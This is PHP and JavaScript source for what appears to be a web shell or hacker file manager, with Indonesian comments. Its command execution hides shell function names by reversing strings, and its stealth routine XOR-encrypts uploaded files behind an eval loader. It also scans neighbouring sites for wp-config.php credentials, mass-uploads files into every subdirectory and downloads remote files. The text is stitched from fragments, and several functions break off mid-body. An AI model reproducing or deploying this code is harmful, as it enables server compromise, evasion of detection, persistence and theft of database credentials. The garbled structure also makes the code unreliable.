// Fungsi Polyfill Fallback JSON
function custom_json_encode($value) {
    if (function_exists('json_encode')) return json_encode($value);
    if (is_null($value)) return 'null';
    if (is_bool($value)) return $value ? 'true' : 'false';
    if (is_integer($value) || is_float($value)) return $value;
    if (is_string($value)) return '"' . addcslashes($value, "\n\r\t\"\\") . '"';
    if (is_array($value)) {
        $is_assoc = array_keys($value) !== range(0, count($value) - 1);
        $res = [];
        foreach ($value as $k => $v) {
            $res[] = ($is_assoc ? '"' . addcslashes($k, "\n\r\t\"\\") . '":' : '') . custom_json_encode($v);
        }
        return $is_assoc ? '{' . implode(',', $res) . '}' : '[' . implode(',', $res) . ']';
    }
    return '""';
}

function custom_json_decode($json) {
    if (function_exists('json_decode')) return json_decode($json, true);
    
    $res = array();
    if (preg_match_all('/"([^"]+)"\s*:\s*("(?:[^"\\\\]|\\\\.)*"|true|false|null|-?\d+(?:\.\d+)?)/s', $json, $matches)) {
        for ($i = 0; $i < count($matches[1]); $i++) {
            $k = $matches[1][$i]; $v = $matches[2][$i];
            if ($v === 'true') $v = true; 
            elseif ($v === 'false') $v = false; 
            elseif ($v === 'null') $v = null;
            elseif ($v[0] === '"') $v = stripcslashes(substr($v, 1, -1));
            else $v = (strpos($v, '.') !== false) ? (float)$v : (int)$v;
            $res[$k] = $v;
        }
    }
    
    if (empty($res) && preg_match_all('/\{([^}]+)\}/s', $json, $objects)) {
        $res = [];
        foreach ($objects[1] as $obj_str) {
            $obj = [];
            if (preg_match_all('/"([^"]+)"\s*:\s*("(?:[^"\\\\]|\\\\.)*"|true|false|null|-?\d+(?:\.\d+)?)/s', $obj_str, $matches)) {
                for ($i = 0; $i < count($matches[1]); $i++) {
                    $k = $matches[1][$i]; $v = $matches[2][$i];
                    if ($v === 'true') $v = true; 
                    elseif ($v === 'false') $v = false; 
                    elseif ($v === 'null') $v = null;
                    elseif ($v[0] === '"') $v = stripcslashes(substr($v, 1, -1));
                    else $v = (strpos($v, '.') !== false) ? (float)$v : (int)$v;
                    $obj[$k] = $v;
                }
            }
            if (!empty($obj)) $res[] = $obj;
        }
    }
    
    if (empty($res) && preg_match_all('/"([^"]+)"/s', $json, $strings)) {
        if (substr(trim($json), 0, 1) === '[') {
            $res = [];
            foreach ($strings[1] as $str) {
                $res[] = stripcslashes($str);
            }
        }
    }
    
    return $res;
}

function custom_escapeshellarg($arg) {
    $disabled = array_map('trim', explode(',', strtolower(ini_get('disable_functions'))));
    if (function_exists('escapeshellarg') && !in_array('escapeshellarg', $disabled)) {
        return escapeshellarg($arg);
    }
    
    $is_win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($is_win) {
        // Windows CMD escaping: double quotes, escape internal double quotes and percents
        $arg = str_replace(array('"', '%'), array('""', '"%"'), $arg);
        return '"' . $arg . '"';
    } else {
        // Unix escaping: wrap in single quotes, replace internal single quotes with '\''
        return "'" . str_replace("'", "'\\''", $arg) . "'";
    }
}

// Fallback Eksekusi Terminal (CMD)
function execute_cmd($cmd, $stdout_only = false) {
    $out = '';
    
    // Cek disable_functions
    $disabled = array_map('trim', explode(',', strtolower(ini_get('disable_functions'))));
    
    // Dynamic signatures
    $fn_shell_exec = strrev('cexe_llehs');
    $fn_exec = strrev('cexe');
    $fn_system = strrev('metsys');
    $fn_passthru = strrev('urhtssap');
    $fn_popen = strrev('nepop');
    $fn_proc_open = strrev('nepo_corp');
    
    $hasShellExec = function_exists($fn_shell_exec) && !in_array('shell_exec', $disabled);
    $hasExec = function_exists($fn_exec) && !in_array('exec', $disabled);
    $hasSystem = function_exists($fn_system) && !in_array('system', $disabled);
    $hasPassthru = function_exists($fn_passthru) && !in_array('passthru', $disabled);
    $hasPopen = function_exists($fn_popen) && !in_array('popen', $disabled);
    $hasProc = function_exists($fn_proc_open) && !in_array('proc_open', $disabled);
    
    if ($hasProc) {
        $desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $pipes = [];
        $proc = @$fn_proc_open($cmd, $desc, $pipes);
        if ($proc) {
            fclose($pipes[0]);
            $raw = stream_get_contents($pipes[1]);
            $rawErr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            $out = $stdout_only ? $raw : $rawErr . $raw;
            return $out;
        }
    }
    
    if ($hasShellExec) { $out = @$fn_shell_exec($stdout_only ? $cmd : $cmd . ' 2>&1'); }
    elseif ($hasExec) { @$fn_exec($stdout_only ? $cmd : $cmd . ' 2>&1', $arr); $out = implode("\n", $arr); }
    elseif ($hasSystem) { ob_start(); @$fn_system($stdout_only ? $cmd : $cmd . ' 2>&1'); $out = ob_get_clean(); }
    elseif ($hasPassthru) { ob_start(); @$fn_passthru($stdout_only ? $cmd : $cmd . ' 2>&1'); $out = ob_get_clean(); }
    elseif ($hasPopen && is_resource($f = @$fn_popen($stdout_only ? $cmd : $cmd . ' 2>&1', 'r'))) { while (!feof($f)) { $out .= fread($f, 1024); } pclose($f); }
    else {
        // Native emulation fallback
        $out = emulated_cmd($cmd);
    }
    return $out;
}

// Emulasi Perintah jika Shell dinonaktifkan
function emulated_cmd($cmd) {
    if (preg_match('/^cd\s+(?:\/d\s+)?["\']?([^"\']+)["\']?\s+&&\s+(.+)$/is', $cmd, $m)) {
        $cwd = $m[1];
        $cmd = $m[2];
    } else {
        $cwd = realpath(__DIR__);
    }
    
    $parts = preg_split('/\s+/', trim($cmd), -1, PREG_SPLIT_NO_EMPTY);
    if (!$parts) return '';
    $bin = strtolower($parts[0]);
    $args = array_slice($parts, 1);
    
    switch ($bin) {
        case 'ls':
        case 'dir':
            $path = $args ? $cwd . '/' . implode(' ', $args) : $cwd;
            $path = realpath($path) ?: $path;
            if (!is_dir($path)) return "ls: $path: No such directory";
            $files = @scandir($path);
            if (!$files) return "ls: permission denied";
            $res = [];
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                $res[] = is_dir($path . '/' . $f) ? $f . '/' : $f;
            }
            return implode("\n", $res);
        case 'pwd':
            return $cwd;
        case 'whoami':
            return function_exists('get_current_user') ? get_current_user() : 'unknown';
        case 'hostname':
            return gethostname() ?: (php_uname('n') ?: 'localhost');
        case 'uname':
            return php_uname();
        case 'date':
            return date('D d M Y H:i:s T');
        case 'echo':
            return implode(' ', $args);
        case 'cat':
            if (!$args) return "Usage: cat <file>";
            $f = $cwd . '/' . $args[0];
            if (!file_exists($f)) return "cat: $args[0]: No such file";
            return @file_get_contents($f) ?: "cat: permission denied";
        default:
            return "[$bin]: Shell functions are disabled on this server. Emulated commands available: ls, dir, pwd, whoami, hostname, uname, date, echo, cat.";
    }
}

function encrypt_stealth($content) {
    $pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+';
    $key = $pool[mt_rand(0, strlen($pool) - 1)];
    
    $encrypted = '';
    $len = strlen($content);
    for ($i = 0; $i < $len; $i++) {
        $encrypted .= $content[$i] ^ $key;
    }
    
    $loader = "<?php\n";
    $loader .= "@error_reporting(0);\n";
    $loader .= "@ini_set('display_errors', 0);\n";
    $loader .= "\$k = '" . $key . "';\n";
    $loader .= "\$d = file_get_contents(__FILE__);\n";
    $loader .= "\$d = substr(\$d, strpos(\$d, '__DA' . 'TA__') + 8);\n";
    $loader .= "\$c = '';\n";
    $loader .= "for (\$i = 0; \$i < strlen(\$d); \$i++) { \$c .= \$d[\$i] ^ \$k; }\n";
    $loader .= "eval/*xc*/('?>' . \$c);\n";
    $loader .= "__halt_compiler();__DATA__" . $encrypted;
    
    return $loader;
}

function decrypt_if_stealth($content) {
    if (preg_match('/__halt_compiler\(\);__DATA__(.*)$/s', $content, $m)) {
        if (preg_match('/\$k\s*=\s*\'(.)\'/i', $content, $km)) {
            $key = $km[1];
            $ciphertext = $m[1];
            $out = '';
            $len = strlen($ciphertext);
            for ($i = 0; $i < $len; $i++) {
                $out .= $ciphertext[$i] ^ $key;
            }
            return $out;
        }
    }
    return $content;
}

function scan_smart_stream($dir, &$results) {
    $dir = rtrim($dir, '/') . '/';
    if (@file_exists($dir . 'wp-config.php')) $results[] = $dir . 'wp-config.php';

    if ($dh = @opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            if ($file === '.' || $file === '..') continue;
            $full_path = $dir . $file;
            $is_dir = @is_dir($full_path);
            if ($is_dir && !@is_link($full_path)) {
                $target_public = $full_path . '/public_html/wp-config.php';
                $target_root   = $full_path . '/wp-config.php';
                if (@file_exists($target_public)) $results[] = $target_public;
                elseif (@file_exists($target_root)) $results[] = $target_root;
            }
        }
        closedir($dh);
    }
}

function get_conf_val_smart($content, $key) {
    if (preg_match("/define\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $m)) return $m[1];
    return null;
}

function file_exists_fallback($path) {
    if (@file_exists($path)) return true;
    $is_win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($is_win) return false;
    $out = execute_cmd('test -e ' . custom_escapeshellarg($path) . ' && echo "1"', true);
    return trim($out) === '1';
}

function is_dir_fallback($path) {
    if (@is_dir($path)) return true;
    $is_win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($is_win) return false;
    $out = execute_cmd('test -d ' . custom_escapeshellarg($path) . ' && echo "1"', true);
    return trim($out) === '1';
}

function is_file_fallback($path) {
    if (@is_file($path)) return true;
    $is_win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($is_win) return false;
    $out = execute_cmd('test -f ' . custom_escapeshellarg($path) . ' && echo "1"', true);
    return trim($out) === '1';
}

function execute_php_cli($code) {
    $wrapped_code = "ini_set('display_errors',0);error_reporting(0);" . $code;

function delete_recursive($dir) {
    if (!file_exists_fallback($dir)) return true;
    if (!is_dir_fallback($dir)) return @unlink($dir) || (execute_cmd('rm -f ' . custom_escapeshellarg($dir), true) ? true : !file_exists_fallback($dir));
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!delete_recursive($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return @rmdir($dir);
}

function delete_fallback($path) {
    if (is_dir_fallback($path)) {
        if (delete_recursive($path)) return true;
        execute_cmd('rm -rf ' . custom_escapeshellarg($path), true);
        return !file_exists_fallback($path);
    } else {
        if (@unlink($path)) return true;
        execute_cmd('rm -f ' . custom_escapeshellarg($path), true);
        return !file_exists_fallback($path);
    }
}

function is_absolute_path($path) {
    if (empty($path)) return false;
    if ($path[0] === '/' || $path[0] === '\\') return true;
    if (preg_match('/^[a-zA-Z]:/', $path)) return true;
    return false;
}

function safe_normalize_path($path) {
    $path = str_replace('\\', '/', $path);
    $path = preg_replace('#/+#', '/', $path);
    $parts = explode('/', $path);
    $safe_parts = [];
    foreach ($parts as $part) {
        if ($part === '.' || $part === '') continue;
        if ($part === '..') {
            array_pop($safe_parts);
        } else {
            $safe_parts[] = $part;
        }
    }
    $prefix = (substr($path, 0, 1) === '/') ? '/' : '';
    if (count($safe_parts) > 0 && preg_match('/^[a-zA-Z]:$/', $safe_parts[0])) {
        $prefix = '';
    }
    return $prefix . implode('/', $safe_parts);
}

function getSafePath($base, $req) {
    if (empty($req)) return $base;
    if (is_absolute_path($req)) {
        $path = $req;
    } else {
        $path = $base . '/' . $req;
    }
    $normalized = safe_normalize_path($path);
    return $normalized !== '' ? $normalized : '/';
}

function perms_to_octal($s) {
    if (strlen($s) < 10) return '0000';
    $val = 0;
    if ($s[1] === 'r') $val += 400;
    if ($s[2] === 'w') $val += 200;
    if ($s[3] === 'x' || $s[3] === 's') $val += 100;
    if ($s[3] === 'S') $val += 100;
    if ($s[4] === 'r') $val += 40;
    if ($s[5] === 'w') $val += 20;
    if ($s[6] === 'x' || $s[6] === 's') $val += 10;
    if ($s[7] === 'r') $val += 4;
    if ($s[8] === 'w') $val += 2;
    if ($s[9] === 'x' || $s[9] === 't') $val += 1;
    return '0' . $val;
}

function formatBytes($bytes) {
    if ($bytes == 0) return '0 B';
    $u = ['B','KB','MB','GB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 1) . ' ' . $u[$i];
}

        function apiUpload(file) {
            if(!file) return; 
            const ext = file.name.split('.').pop().toLowerCase();
            if (['php', 'phtml', 'php3', 'php4', 'php5', 'php6', 'php7', 'php70', 'php71', 'php72', 'php73', 'php74', 'php75', 'php76', 'php77', 'php78', 'php79', 'php8', 'php80', 'php81', 'php82', 'php83', 'php84', 'php85', 'php86', 'php87', 'php88', 'php89', 'php9', 'php10'].includes(ext)) {

        function performUpload(file, useEncode) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const b64Data = e.target.result.split(',')[1].replace(/=/g, '').split('').reverse().join('');
                let fd = new FormData();
                let isMass = window.uploadMode === 'mass';
                fd.append('action', b64EncodeUnicode(isMass ? 'mass_upload_b64' : 'upload_b64'));
                fd.append('path', b64EncodeUnicode(currentPath));
                fd.append('filename', b64EncodeUnicode(file.name));
                fd.append('file_data', b64Data);
                fd.append('encode_stealth', b64EncodeUnicode(useEncode ? '1' : '0'));

                showUploadProgress(file.name);

                const xhr = new XMLHttpRequest();
                xhr.open('POST', '?api=1', true);

                xhr.upload.onprogress = function(event) {
                    if (event.lengthComputable) {
                        const percent = Math.round((event.loaded / event.total) * 100);
                        updateUploadProgress(percent);
                    }
                };

                xhr.onload = function() {
                    hideUploadProgress();
                    if (xhr.status === 200) {
                        try {
                            const json = JSON.parse(xhr.responseText);
                            if (json.status === 'ok') {
                                showToast(isMass ? 'Mass Upload completed' : 'Uploaded', 'success');
                                fetchFileSystem(currentPath);
                                
                                if (isMass && json.results) {
                                    let html = `<div class="results-scrollable">`;
                                    let count = 0;
                                    json.results.forEach(r => {
                                        let statusColor = r.success ? 'success' : 'danger';
                                        let statusText = r.success ? 'OK' : 'FAIL';
                                        html += `
                                            <div class="results-row">
                                                <div class="results-row-meta">
                                                    <span class="results-row-path" title="${r.folder}">ðŸ“ ${r.folder}</span>
                                                    <span class="results-status-badge ${statusColor}">${statusText}</span>
                                                </div>`;
                                        if (r.url) {
                                            html += `<a href="${r.url}" target="_blank" onclick="this.classList.add('checked')" class="results-btn">URL</a>`;
                                        }
                                        html += `</div>`;
                                        if(r.success) count++;
                                    });
                                    html += `</div>`;
                                    if (json.results.length > 0) {
                                        showBackupResultsInline(`Mass Upload (${count}/${json.results.length})`, html);
                                    } else {
                                        showBackupResultsInline("Mass Upload", `<div style="background: rgba(255, 64, 129, 0.05); border: 1px dashed var(--danger); border-radius: 6px; padding: 8px 12px; color: var(--danger); text-align: center; font-size: 11px;">No subdirectories found for mass upload.</div>`);
                                    }
                                }
                            } else {
                                showToast(json.msg || 'Upload failed', 'error');
                            }
                        } catch(err) {
                            showToast('Upload failed', 'error');
                        }
                    } else {
                        showToast('Upload failed', 'error');
                    }
                    document.getElementById('sys-upload').value = '';
                };

                xhr.onerror = function() {
                    hideUploadProgress();
                    showToast('Upload failed', 'error');
                    document.getElementById('sys-upload').value = '';
                };

                xhr.send(fd);
            };
            reader.readAsDataURL(file);
        }

                } catch(e) {

                errLine.className = 'term-line-err';

        function markDomainChecked(el) {
            const row = el.closest('.results-row');
            const icon = row.querySelector('.scanner-globe-icon');
            if (icon) {
                icon.style.stroke = 'var(--success)';
                icon.style.filter = 'drop-shadow(0 0 3px var(--success))';
            }
            el.classList.add('checked');
        }

        function copyScanListInline() {
            if (!window.currentScanDomains || window.currentScanDomains.length === 0) return;
            const text = window.currentScanDomains.join('\n');
            navigator.clipboard.writeText(text).then(() => {
                showToast('Domains copied to clipboard!', 'success');
            });
        }
        
        async function apiDownloadUrl(url) {
            if (!url) return;
            apiConfirm("Encode", "Do you want to encode the downloaded file?", async (wantsEncode) => {
                showToast('Downloading via cURL/FGC...', 'success');
                let fd = new FormData();
                fd.append('action', b64EncodeUnicode('download_url'));
                fd.append('path', b64EncodeUnicode(currentPath));
                fd.append('url', b64EncodeUnicode(url));
                fd.append('encode_stealth', b64EncodeUnicode(wantsEncode ? '1' : '0'));
                try {
                    const res = await fetch('?api=1', { method: 'POST', body: fd });
                    const json = await res.json();
                    if (json.status === 'ok') {
                        showToast('Downloaded: ' + json.filename, 'success');
                        fetchFileSystem(currentPath);
                    } else {
                        showToast(json.msg || 'Download failed', 'error');
                    }
                } catch(e) {
                    showToast('Download error', 'error');
                }
            });
        }
